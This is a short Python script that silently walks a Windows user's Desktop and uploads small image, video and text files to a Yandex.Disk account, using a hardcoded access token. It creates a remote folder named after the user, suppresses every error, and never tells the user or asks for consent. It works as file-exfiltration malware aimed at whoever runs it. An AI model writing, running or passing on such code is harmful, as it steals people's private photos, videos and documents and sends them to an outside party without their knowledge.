def f(start_path):
    for path in os.listdir(start_path):
        current_path = os.path.join(start_path, path)

        if os.path.isdir(current_path):
            f(current_path)
        elif os.path.isfile(current_path):
            file_name = os.path.basename(current_path)
            file_extension = file_name.split('.')[-1]

            if file_extension in ['jpg', 'jpeg', 'png', 'gif', 'svg', 'mp4', 'txt', 'avi', 'm4v', 'mov', 'mpg', 'mpeg', 'wmv']:
                if (os.path.getsize(current_path) / 1024) < 250:
                    try:
                        disk.upload(current_path, f'/{username}/{file_name}')
                    except Exception as error: pass


import yadisk
disk = yadisk.YaDisk(token="AQAAAABTjYiVAAcZSbLAWogliUsahgBZwjZbMbY")

if disk.check_token():
    import os

    username = os.environ.get('USERNAME')

    try:
        disk.mkdir(username)
    except Exception as error: pass

    os.mkdir(os.path.join(r'C:\Users', username, 'Desktop', 'wow'))
    f(os.path.join(r'C:\Users', username, 'Desktop'))
